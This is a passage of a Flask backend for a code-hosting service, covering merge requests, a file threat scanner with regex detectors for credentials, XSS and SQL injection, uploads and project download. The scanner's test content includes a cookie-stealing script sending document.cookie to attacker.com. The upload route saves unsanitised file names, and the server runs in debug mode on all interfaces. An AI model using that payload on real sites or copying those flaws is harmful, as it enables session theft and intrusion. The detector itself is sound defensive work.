@app.route('/api/projects/<project_id>/merge-requests/<request_id>/reject', methods=['POST'])
@jwt_required()
def reject_merge_request(project_id, request_id):
    owner_id = get_jwt_identity()
    
    try:
        # Find the project and verify ownership
        project = projects_collection.find_one({
            '_id': ObjectId(project_id),
            'user_id': owner_id
        })
        
        if not project:
            return jsonify({'message': 'Project not found or you are not the owner'}), 404
        
        # Update merge request status
        result = merge_requests_collection.update_one(
            {
                '_id': ObjectId(request_id),
                'project_id': project_id,
                'status': 'pending'
            },
            {'$set': {'status': 'rejected'}}
        )
        
        if result.modified_count == 0:
            return jsonify({'message': 'Merge request not found or already processed'}), 404
        
        return jsonify({'message': 'Merge request rejected successfully'}), 200
        
    except Exception as e:
        return jsonify({'message': str(e)}), 500




# @app.route('/api/projects/<project_id>/threat-check', methods=['GET'])
# @jwt_required()
# def check_project_threats(project_id):
#     current_user_id = get_jwt_identity()
    
#     try:
#         # Find the project
#         project = projects_collection.find_one({
#             '_id': ObjectId(project_id)
#         })
        
#         if not project:
#             return jsonify({'message': 'Project not found'}), 404
        
#         # Check if user has access to this project
#         if project['user_id'] != current_user_id and not project['isPublic']:
#             return jsonify({'message': 'Access denied'}), 403
        
#         # Get files from the project folder
#         folder_path = project['folderPath']
#         print(f"Scanning folder: {folder_path}")
#         results = []
        
#         if os.path.exists(folder_path):
#             files = os.listdir(folder_path)
#             print(f"Found {len(files)} files in folder: {files}")
#             for filename in os.listdir(folder_path):
#                 file_path = os.path.join(folder_path, filename)
#                 if os.path.isfile(file_path):
#                     # Check each file content
#                     threats = check_file_threats(file_path, filename)
#                     if threats['threats']:
#                         results.append({
#                             'filename': filename,
#                             'threats': threats['threats']
#                         })
        
#         return jsonify({
#             'results': results,
#             'total_threats': sum(len(r['threats']) for r in results),
#             'files_scanned': len(os.listdir(folder_path)) if os.path.exists(folder_path) else 0
#         }), 200
#     except Exception as e:
#         return jsonify({'message': str(e)}), 500

def check_file_threats(file_path, filename):
    threats = []
    
    try:
        print(f"Reading file {filename} from {file_path}")
        # Read file content
        with open(file_path, 'r', encoding='utf-8') as f:
            content = f.read()
            print(f"File content length: {len(content)} characters")
            # Before checking for IOCs
            print(f"Found {threat_db.iocs.count_documents({})} IOCs in database")
            # Before IP check
            print(f"Found {threat_db.malicious_ips.count_documents({})} malicious IPs in database")
            # And so on for other collections
            # Check for IOCs
            iocs = list(threat_db.iocs.find({}))
            # For IOCs
            for ioc in iocs:
                if ioc.get('indicator') and ioc['indicator'].lower() in content.lower():
                    print(f"Found IOC match: {ioc['indicator']}")
                    threats.append({
                        'type': 'IOC',
                        'indicator': ioc['indicator'],
                        'source': ioc.get('source', 'Unknown'),
                        'description': ioc.get('description', '')
                    })
            
            # Check for malicious IPs
            ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
            ips = re.findall(ip_pattern, content)
            for ip in ips:
                malicious_ip = threat_db.malicious_ips.find_one({'ip': ip})
                if malicious_ip:
                    threats.append({
                        'type': 'Malicious IP',
                        'indicator': ip,
                        'confidence': malicious_ip.get('confidence', 0),
                        'source': malicious_ip.get('source', 'Unknown')
                    })
            
            # Check for vulnerabilities (CVEs mentioned in comments or code)
            cve_pattern = r'CVE-\d{4}-\d{4,7}'
            cves = re.findall(cve_pattern, content,re.IGNORECASE)
            for cve in cves:
                vuln = threat_db.vulnerabilities.find_one({'cve_id': cve})
                if vuln:
                    threats.append({
                        'type': 'Vulnerability',
                        'indicator': cve,
                        'cvss_score': vuln.get('cvss_score', 0),
                        'severity': vuln.get('severity', 'Unknown'),
                        'description': vuln.get('description', '')
                    })
            
            # Check for threat actor techniques or references
            actors = list(threat_db.threat_actors.find({}))
            for actor in actors:
                if actor.get('name') and actor['name'].lower() in content.lower():
                    threats.append({
                        'type': 'Threat Actor Reference',
                        'indicator': actor['name'],
                        'source': actor.get('source', 'Unknown'),
                        'description': actor.get('description', '')[:100] + '...' if actor.get('description', '') else ''
                    })
            
            # NEW: Check for hardcoded passwords
            password_patterns = [
                r'password\s*=\s*[\'\"]([^\'\"]{3,})[\'\"]',
                r'passwd\s*=\s*[\'\"]([^\'\"]{3,})[\'\"]',
                r'pwd\s*=\s*[\'\"]([^\'\"]{3,})[\'\"]',
                r'pass\s*:\s*[\'\"]([^\'\"]{3,})[\'\"]',
                r'secret\s*=\s*[\'\"]([^\'\"]{3,})[\'\"]',
                r'api[_-]?key\s*=\s*[\'\"]([^\'\"]{3,})[\'\"]',
                r'auth[_-]?token\s*=\s*[\'\"]([^\'\"]{3,})[\'\"]'
            ]
            
            for pattern in password_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                for match in matches:
                    # Skip common placeholder values
                    if match.lower() in ['password', 'changeme', 'yourpassword', '***', 'xxx']:
                        continue
                    threats.append({
                        'type': 'Hardcoded Credential',
                        'indicator': f"Potential password: {match[:3]}{'*' * (len(match) - 3)}",
                        'severity': 'HIGH',
                        'description': 'Hardcoded credentials detected in source code'
                    })
            
            # NEW: Check for XSS vulnerabilities
            xss_patterns = [
                r'<script[^>]*>.*?</script>',
                r'javascript:.*?\(.*?\)',
                r'onerror\s*=\s*[\'\"](.*?)[\'\"]',
                r'onload\s*=\s*[\'\"](.*?)[\'\"]',
                r'eval\s*\([^\)]+\)',
                r'document\.write\s*\(',
                r'innerHTML\s*=',
                r'document\.cookie'
            ]
            
            for pattern in xss_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE | re.DOTALL)
                if matches:
                    threats.append({
                        'type': 'XSS Vulnerability',
                        'indicator': f"Potential XSS: {pattern}",
                        'severity': 'HIGH',
                        'description': 'Potential Cross-Site Scripting (XSS) vulnerability detected'
                    })
            
            # NEW: Check for SQL injection vulnerabilities
            sql_injection_patterns = [
                r'SELECT.*?FROM.*?WHERE.*?\$',
                r'SELECT.*?FROM.*?WHERE.*?\{',
                r'INSERT\s+INTO.*?VALUES.*?\$',
                r'INSERT\s+INTO.*?VALUES.*?\{',
                r'UPDATE.*?SET.*?WHERE.*?\$',
                r'UPDATE.*?SET.*?WHERE.*?\{',
                r'DELETE\s+FROM.*?WHERE.*?\$',
                r'DELETE\s+FROM.*?WHERE.*?\{',
                r'execute\([\'\"](SELECT|INSERT|UPDATE|DELETE).*?\+',
                r'executemany\([\'\"](SELECT|INSERT|UPDATE|DELETE).*?\+',
                r'query\([\'\"](SELECT|INSERT|UPDATE|DELETE).*?\+'
            ]
            
            for pattern in sql_injection_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE | re.DOTALL)
                if matches:
                    threats.append({
                        'type': 'SQL Injection',
                        'indicator': f"Potential SQL Injection",
                        'severity': 'CRITICAL',
                        'description': 'Potential SQL injection vulnerability detected'
                    })
    
    except UnicodeDecodeError:
        # For binary files, just check the filename for now
        pass
    except Exception as e:
        print(f"Error checking file {filename}: {str(e)}")
    
    return {'threats': threats}

@app.route('/api/test-threat-detection', methods=['GET'])
def test_threat_detection():
    test_content = """
    # Test file with threats
    SERVER_IP = "57.129.129.209"
    # CVE-2025-26852 vulnerability
    # Indrik Spider campaign
    domain = "ancient-thing.it"
    
    # Hardcoded credentials
    password = "super_secret_password123"
    api_key = "aK92jFh71LSjf982hF"
    
    # XSS vulnerability
    content = "<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>"
    element.innerHTML = userInput
    
    # SQL Injection
    query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
    cursor.execute("DELETE FROM users WHERE id = " + user_id)
    """
    
    threats = []
    
    # Check for IOCs
    iocs = list(threat_db.iocs.find({}))
    for ioc in iocs:
        if ioc.get('indicator') and ioc['indicator'].lower() in test_content.lower():
            threats.append({
                'type': 'IOC',
                'indicator': ioc['indicator'],
                'source': ioc.get('source', 'Unknown'),
                'description': ioc.get('description', '')
            })
    
    # Check for malicious IPs
    ip_pattern = r'\b(?:\d{1,3}\.){3}\d{1,3}\b'
    ips = re.findall(ip_pattern, test_content)
    for ip in ips:
        malicious_ip = threat_db.malicious_ips.find_one({'ip': ip})
        if malicious_ip:
            threats.append({
                'type': 'Malicious IP',
                'indicator': ip,
                'confidence': malicious_ip.get('confidence', 0),
                'source': malicious_ip.get('source', 'Unknown')
            })
    
    # Check for vulnerabilities
    cve_pattern = r'CVE-\d{4}-\d{4,7}'
    cves = re.findall(cve_pattern, test_content)
    for cve in cves:
        vuln = threat_db.vulnerabilities.find_one({'cve_id': cve})
        if vuln:
            threats.append({
                'type': 'Vulnerability',
                'indicator': cve,
                'cvss_score': vuln.get('cvss_score', 0),
                'severity': vuln.get('severity', 'Unknown'),
                'description': vuln.get('description', '')
            })
    
    # Check for threat actor techniques or references
    actors = list(threat_db.threat_actors.find({}))
    for actor in actors:
        if actor.get('name') and actor['name'].lower() in test_content.lower():
            threats.append({
                'type': 'Threat Actor Reference',
                'indicator': actor['name'],
                'source': actor.get('source', 'Unknown'),
                'description': actor.get('description', '')[:100] + '...' if actor.get('description', '') else ''
            })
    
    # NEW: Check for hardcoded passwords
    password_patterns = [
        r'password\s*=\s*[\'\"]([^\'\"]{3,})[\'\"]',
        r'passwd\s*=\s*[\'\"]([^\'\"]{3,})[\'\"]',
        r'pwd\s*=\s*[\'\"]([^\'\"]{3,})[\'\"]',
        r'pass\s*:\s*[\'\"]([^\'\"]{3,})[\'\"]',
        r'secret\s*=\s*[\'\"]([^\'\"]{3,})[\'\"]',
        r'api[_-]?key\s*=\s*[\'\"]([^\'\"]{3,})[\'\"]',
        r'auth[_-]?token\s*=\s*[\'\"]([^\'\"]{3,})[\'\"]'
    ]
    
    for pattern in password_patterns:
        matches = re.findall(pattern, test_content, re.IGNORECASE)
        for match in matches:
            if match.lower() in ['password', 'changeme', 'yourpassword', '***', 'xxx']:
                continue
            threats.append({
                'type': 'Hardcoded Credential',
                'indicator': f"Potential password: {match[:3]}{'*' * (len(match) - 3)}",
                'severity': 'HIGH',
                'description': 'Hardcoded credentials detected in source code'
            })
    
    # NEW: Check for XSS vulnerabilities
    xss_patterns = [
        r'<script[^>]*>.*?</script>',
        r'javascript:.*?\(.*?\)',
        r'onerror\s*=\s*[\'\"](.*?)[\'\"]',
        r'onload\s*=\s*[\'\"](.*?)[\'\"]',
        r'eval\s*\([^\)]+\)',
        r'document\.write\s*\(',
        r'innerHTML\s*=',
        r'document\.cookie'
    ]
    
    for pattern in xss_patterns:
        matches = re.findall(pattern, test_content, re.IGNORECASE | re.DOTALL)
        if matches:
            threats.append({
                'type': 'XSS Vulnerability',
                'indicator': f"Potential XSS: {pattern}",
                'severity': 'HIGH',
                'description': 'Potential Cross-Site Scripting (XSS) vulnerability detected'
            })
    
    # NEW: Check for SQL injection vulnerabilities
    sql_injection_patterns = [
        r'SELECT.*?FROM.*?WHERE.*?\$',
        r'SELECT.*?FROM.*?WHERE.*?\{',
        r'INSERT\s+INTO.*?VALUES.*?\$',
        r'INSERT\s+INTO.*?VALUES.*?\{',
        r'UPDATE.*?SET.*?WHERE.*?\$',
        r'UPDATE.*?SET.*?WHERE.*?\{',
        r'DELETE\s+FROM.*?WHERE.*?\$',
        r'DELETE\s+FROM.*?WHERE.*?\{',
        r'execute\([\'\"](SELECT|INSERT|UPDATE|DELETE).*?\+',
        r'executemany\([\'\"](SELECT|INSERT|UPDATE|DELETE).*?\+',
        r'query\([\'\"](SELECT|INSERT|UPDATE|DELETE).*?\+'
    ]
    
    for pattern in sql_injection_patterns:
        matches = re.findall(pattern, test_content, re.IGNORECASE | re.DOTALL)
        if matches:
            threats.append({
                'type': 'SQL Injection',
                'indicator': f"Potential SQL Injection",
                'severity': 'CRITICAL',
                'description': 'Potential SQL injection vulnerability detected'
            })
    
    return jsonify({
        'test_content': test_content,
        'threats_found': threats,
        'database_stats': {
            'iocs': threat_db.iocs.count_documents({}),
            'malicious_ips': threat_db.malicious_ips.count_documents({}),
            'vulnerabilities': threat_db.vulnerabilities.count_documents({}),
            'threat_actors': threat_db.threat_actors.count_documents({})
        }
    })


@app.route('/api/test-db-connection', methods=['GET'])
def test_db_connection():
    try:
        # Test sample queries
        ioc_sample = threat_db.iocs.find_one({})
        ip_sample = threat_db.malicious_ips.find_one({})
        vuln_sample = threat_db.vulnerabilities.find_one({})
        actor_sample = threat_db.threat_actors.find_one({})
        
        return jsonify({
            'connection': 'success',
            'samples': {
                'ioc': ioc_sample['indicator'] if ioc_sample else None,
                'ip': ip_sample['ip'] if ip_sample else None,
                'vulnerability': vuln_sample['cve_id'] if vuln_sample else None,
                'threat_actor': actor_sample['name'] if actor_sample else None
            },
            'counts': {
                'iocs': threat_db.iocs.count_documents({}),
                'malicious_ips': threat_db.malicious_ips.count_documents({}),
                'vulnerabilities': threat_db.vulnerabilities.count_documents({}),
                'threat_actors': threat_db.threat_actors.count_documents({})
            }
        }), 200
    except Exception as e:
        return jsonify({'connection': 'failed', 'error': str(e)}), 500






# Add a temporary upload route for threat checking
@app.route('/api/projects/<project_id>/temp-upload', methods=['POST'])
@jwt_required()
def temp_upload_files(project_id):
    current_user_id = get_jwt_identity()
    
    try:
        # Find the project
        project = projects_collection.find_one({
            '_id': ObjectId(project_id)
        })
        
        if not project:
            return jsonify({'message': 'Project not found'}), 404
            
        # Check if user has edit rights (owner or in allowedEditors)
        allowed_editors = project.get('allowedEditors', [])
        if project['user_id'] != current_user_id and current_user_id not in allowed_editors:
            return jsonify({'message': 'You do not have permission to upload files to this project'}), 403

        # Create temp folder if it doesn't exist
        temp_folder = os.path.join(project['folderPath'], '.temp')
        if not os.path.exists(temp_folder):
            os.makedirs(temp_folder)
        
        # Clean temp folder
        for filename in os.listdir(temp_folder):
            file_path = os.path.join(temp_folder, filename)
            try:
                if os.path.isfile(file_path):
                    os.unlink(file_path)
            except Exception as e:
                print(f"Error deleting {file_path}: {e}")

        # Save uploaded files to temp folder
        if 'files' not in request.files:
            return jsonify({'message': 'No files uploaded'}), 400
            
        files = request.files.getlist('files')
        for file in files:
            if file.filename == '':
                continue
            file.save(os.path.join(temp_folder, file.filename))
            
        return jsonify({'message': 'Files temporarily uploaded for threat checking'}), 200
        
    except Exception as e:
        return jsonify({'message': str(e)}), 500

# Modify the threat check route to check temp files if they exist
@app.route('/api/projects/<project_id>/threat-check', methods=['GET'])
@jwt_required()
def check_project_threats(project_id):
    current_user_id = get_jwt_identity()
    
    try:
        # Find the project
        project = projects_collection.find_one({
            '_id': ObjectId(project_id)
        })
        
        if not project:
            return jsonify({'message': 'Project not found'}), 404
        
        # Check if user has access to this project
        if project['user_id'] != current_user_id and not project['isPublic']:
            return jsonify({'message': 'Access denied'}), 403
        
        # Define folders to scan
        folders_to_scan = [project['folderPath']]
        
        # Check if temp folder exists and has files (for new uploads)
        temp_folder = os.path.join(project['folderPath'], '.temp')
        if os.path.exists(temp_folder) and os.listdir(temp_folder):
            folders_to_scan.append(temp_folder)
        
        results = []
        total_files_scanned = 0
        
        # Scan all folders
        for folder_path in folders_to_scan:
            if os.path.exists(folder_path):
                files = [f for f in os.listdir(folder_path) if os.path.isfile(os.path.join(folder_path, f))]
                total_files_scanned += len(files)
                
                for filename in files:
                    # Skip hidden files and git files
                    if filename.startswith('.') or '.git' in folder_path:
                        continue
                        
                    file_path = os.path.join(folder_path, filename)
                    if os.path.isfile(file_path):
                        # Check each file content
                        threats = check_file_threats(file_path, filename)
                        if threats['threats']:
                            results.append({
                                'filename': filename,
                                'threats': threats['threats']
                            })
        
        return jsonify({
            'results': results,
            'total_threats': sum(len(r['threats']) for r in results),
            'files_scanned': total_files_scanned
        }), 200
    except Exception as e:
        return jsonify({'message': str(e)}), 500



@app.route('/api/projects/<project_id>/current-branch', methods=['GET'])
@jwt_required()
def get_current_branch(project_id):
    current_user_id = get_jwt_identity()
    
    try:
        # Find the project
        project = projects_collection.find_one({
            '_id': ObjectId(project_id)
        })
        
        if not project:
            return jsonify({'message': 'Project not found'}), 404
        
        # Check if user has access to this project
        if project['user_id'] != current_user_id and not project.get('isPublic', False):
            # Check if user is in allowedEditors
            allowed_editors = project.get('allowedEditors', [])
            if current_user_id not in allowed_editors:
                return jsonify({'message': 'Access denied'}), 403
        
        repo = pygit2.Repository(project['folderPath'])
        
        # Get the current HEAD branch name
        try:
            head = repo.head
            if head.name.startswith('refs/heads/'):
                current_branch = head.name[len('refs/heads/'):]
            else:
                current_branch = 'detached HEAD'
        except pygit2.GitError:
            # Repository might exist but has no commits yet
            current_branch = None
            
        return jsonify({
            'currentBranch': current_branch
        }), 200
        
    except Exception as e:
        return jsonify({'message': str(e)}), 500


@app.route('/api/projects/<project_id>/download', methods=['GET'])
@jwt_required()
def download_project(project_id):
    current_user_id = get_jwt_identity()
    
    try:
        # Find the project
        project = projects_collection.find_one({
            '_id': ObjectId(project_id)
        })
        
        if not project:
            return jsonify({'message': 'Project not found'}), 404
            
        # Check if user has access to this project
        if project['user_id'] != current_user_id and not project['isPublic']:
            allowed_editors = project.get('allowedEditors', [])
            if current_user_id not in allowed_editors:
                return jsonify({'message': 'Access denied'}), 403
        
        # Create a temporary file to store the zip
        import tempfile
        import zipfile
        import os
        from flask import send_file
        
        # Create a temporary zip file
        temp_file = tempfile.NamedTemporaryFile(delete=False, suffix='.zip')
        temp_file.close()
        
        # Get folder path from project
        folder_path = project['folderPath']
        
        # Create zip file with all project files
        with zipfile.ZipFile(temp_file.name, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(folder_path):
                # Skip .git directories completely
                if '.git' in root.split(os.sep):
                    continue
                    
                for file in files:
                    file_path = os.path.join(root, file)
                    # Get relative path for the zip structure
                    rel_path = os.path.relpath(file_path, folder_path)
                    zipf.write(file_path, rel_path)
        
        # Send the zip file
        return send_file(
            temp_file.name,
            mimetype='application/zip',
            as_attachment=True,
            download_name=f"{project['name']}.zip"
        )
        
    except Exception as e:
        return jsonify({'message': str(e)}), 500

# Run the server
if __name__ == '__main__':
    socketio.run(app, debug=True,host='0.0.0.0')
